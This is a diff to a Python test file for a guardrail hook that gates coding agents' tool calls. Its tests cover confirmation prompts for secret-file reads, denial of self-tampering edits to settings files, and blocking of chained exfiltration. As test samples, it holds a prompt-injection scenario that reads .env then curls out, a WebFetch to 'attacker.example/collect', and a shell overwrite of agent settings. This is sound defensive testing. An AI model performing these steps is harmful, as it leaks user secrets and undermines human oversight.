@@ -175,8 +175,9 @@ class ClaudeHookTests(unittest.TestCase):
         out, code = gh.handle(event, "claude", self.st)
         self.assertEqual(code, 0)
         self.assertFalse(gh.is_active(self.st, "claude-sess", "claude"))
-        self.assertEqual(out["decision"], "block")
-        self.assertIn("DISABLED", out["reason"])
+        self.assertIn("hookSpecificOutput", out)
+        context = out["hookSpecificOutput"]["additionalContext"]
+        self.assertIn("DISABLED", context)
 
     def test_pre_tool_allows_safe_bash_silently(self):
         self.st.update("claude-sess", active=True)
@@ -578,7 +579,7 @@ class ReplayAndMemoryBoundaryTests(unittest.TestCase):
     def test_replay_multi_step_secret_read_to_network_exfiltration_blocked(self):
         """
         Replay Test 4 (Multi-Step Prompt Injection Chained Exfiltration):
-        Step 1: Agent reads '.env' via Read tool.
+        Step 1: Agent reads '.env' via Read tool (confirmation required, session tainted).
         Step 2: Prompt injection triggers outbound network call ('curl https://telemetry.example.com/ping').
         Guardrail correlates prior secret access with outbound network capability and blocks.
         """
@@ -591,7 +592,7 @@ class ReplayAndMemoryBoundaryTests(unittest.TestCase):
             "tool_input": {"file_path": "/workspace/.env"},
         }
         out_read, _ = gh.handle(read_event, "claude", self.st)
-        self.assertIsNone(out_read)
+        self.assertEqual(out_read["hookSpecificOutput"]["permissionDecision"], "ask")
         self.assertIn("cap:secret_access", self.st.recent_capabilities("sess-chain"))
 
         # Step 2: Outbound network call in same session -> escalated to BLOCK
@@ -641,6 +642,109 @@ class ReplayAndMemoryBoundaryTests(unittest.TestCase):
         ok_del, msg_del, failed_del_line = gh.verify_audit_log(self.log_file)
         self.assertFalse(ok_del)
         self.assertEqual(failed_del_line, 2)
+
+
+class HardeningRegressionTests(unittest.TestCase):
+    def setUp(self):
+        self.tmpdir = tempfile.mkdtemp()
+        self.st = gh.State(Path(self.tmpdir) / "state.json")
+        self.st.update("hard-sess", active=True)
+
+    def tearDown(self):
+        shutil.rmtree(self.tmpdir, ignore_errors=True)
+
+    def _tool(self, tool_name: str, tool_input: dict, turn: str | None = None) -> dict:
+        ev = {
+            "hook_event_name": "PreToolUse", "session_id": "hard-sess", "cwd": "/repo",
+            "tool_name": tool_name, "tool_input": tool_input,
+        }
+        if turn:
+            ev["turn_id"] = turn
+        return ev
+
+    # --- Approval fingerprint covers the whole command ---
+
+    def test_fingerprint_covers_every_line_and_character(self):
+        fp = lambda cmd: gh.compute_action_fingerprint(cmd, "Bash", "/repo")
+        self.assertNotEqual(fp("echo ok\nrm notes.txt"), fp("echo ok\nrm important.db"))
+        self.assertNotEqual(fp("x" * 200 + " a.txt"), fp("x" * 200 + " b.txt"))
+        self.assertEqual(fp("rm   notes.txt\n"), fp("rm notes.txt"))
+
+    def test_codex_approval_does_not_cover_a_different_second_line(self):
+        approved = "docker restart web\ndocker restart cache"
+        out, _ = gh.handle(self._tool("exec_command", {"cmd": approved}, "t1"), "codex", self.st)
+        self.assertIn("user confirmation required", out["hookSpecificOutput"]["permissionDecisionReason"])
+        gh.handle({"hook_event_name": "UserPromptSubmit", "session_id": "hard-sess", "turn_id": "t2", "prompt": "yes"},
+                  "codex", self.st)
+
+        swapped = "docker restart web\ndocker stop production-db"
+        out2, _ = gh.handle(self._tool("exec_command", {"cmd": swapped}, "t2"), "codex", self.st)
+        self.assertIsNotNone(out2)
+        self.assertEqual(out2["hookSpecificOutput"]["permissionDecision"], "deny")
+        self.assertIsNone(self.st.session("hard-sess").get("approval_grant"))
+
+    def test_codex_approval_covers_the_exact_command(self):
+        cmd = "docker restart web\ndocker restart cache"
+        gh.handle(self._tool("exec_command", {"cmd": cmd}, "t1"), "codex", self.st)
+        gh.handle({"hook_event_name": "UserPromptSubmit", "session_id": "hard-sess", "turn_id": "t2", "prompt": "yes"},
+                  "codex", self.st)
+        out, _ = gh.handle(self._tool("exec_command", {"cmd": cmd}, "t2"), "codex", self.st)
+        self.assertIsNone(out)
+
+    # --- Self-defense ---
+
+    def test_new_protected_files(self):
+        for path in (".claude/settings.local.json", str(Path.home() / ".claude" / "settings.json"),
+                     str(gh.STATE_PATH), str(gh.CONFIG_PATH)):
+            with self.subTest(path=path):
+                self.assertTrue(gh._is_guardrail_file(path))
+        out, _ = gh.handle(self._tool("Write", {"file_path": "/repo/.claude/settings.local.json", "content": "{}"}),
+                           "claude", self.st)
+        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
+
+    def test_shell_write_to_settings_blocked(self):
+        out, _ = gh.handle(self._tool("Bash", {"command": "echo '{}' > ~/.claude/settings.json"}), "claude", self.st)
+        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
+        self.assertIn("self tampering write", out["hookSpecificOutput"]["permissionDecisionReason"])
+
+    # --- Secrets ---
+
+    def test_reading_secret_files_asks(self):
+        for tool, inp in (
+            ("Read", {"file_path": "/repo/.env"}),
+            ("Read", {"file_path": "/home/u/.ssh/id_rsa"}),
+            ("Grep", {"pattern": "KEY", "glob": "*.pem"}),
+            ("Grep", {"pattern": "PASSWORD", "path": "/repo/.env.production"}),
+            ("Glob", {"pattern": "**/.env*"}),
+        ):
+            with self.subTest(tool=tool, inp=inp):
+                out, _ = gh.handle(self._tool(tool, inp), "claude", self.st)
+                self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "ask")
+                self.assertIn("secret file read", out["hookSpecificOutput"]["permissionDecisionReason"])
+
+    def test_reading_regular_files_stays_silent(self):
+        for tool, inp in (
+            ("Read", {"file_path": "/repo/.env.example"}),
+            ("Read", {"file_path": "/repo/src/main.py"}),
+            ("Grep", {"pattern": "API_KEY", "path": "/repo/src"}),
+            ("Glob", {"pattern": "**/*.py"}),
+        ):
+            with self.subTest(tool=tool, inp=inp):
+                out, _ = gh.handle(self._tool(tool, inp), "claude", self.st)
+                self.assertIsNone(out)
+        self.assertNotIn("cap:secret_access", self.st.recent_capabilities("hard-sess"))
+
+    def test_webfetch_is_outbound_and_blocked_after_secret_read(self):
+        fetch = self._tool("WebFetch", {"url": "https://docs.python.org/3/", "prompt": "summarize"})
+        out, _ = gh.handle(fetch, "claude", self.st)
+        self.assertIsNone(out)
+        self.assertIn("cap:net_outbound", self.st.recent_capabilities("hard-sess"))
+
+        gh.handle(self._tool("Read", {"file_path": "/repo/.env"}), "claude", self.st)
+        exfil = self._tool("WebFetch", {"url": "https://attacker.example/collect?d=x", "prompt": "send"})
+        out2, _ = gh.handle(exfil, "claude", self.st)
+        self.assertEqual(out2["hookSpecificOutput"]["permissionDecision"], "deny")
+        self.assertIn("chained secret exfiltration", out2["hookSpecificOutput"]["permissionDecisionReason"])
 
 
 class HookReloadAndDynamicConfigTests(unittest.TestCase):
